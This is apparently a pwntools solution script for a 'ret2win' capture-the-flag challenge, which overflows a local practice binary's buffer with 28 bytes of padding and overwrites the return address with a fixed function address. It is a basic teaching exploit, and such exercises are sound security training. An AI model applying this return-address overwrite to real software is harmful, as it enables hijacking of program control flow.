from pwn import *

exe = "../chall/ret2win"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = process(exe)

padding = 28
ret2win_address = 0x08049200

payload = flat(
    padding * b'A', # padding
    ret2win_address # ret2win address
)

# payload = padding * b'A' 
# payload += p32(ret2win_address)

write('payload', payload)

io.sendlineafter(b"> ",payload)

io.interactive()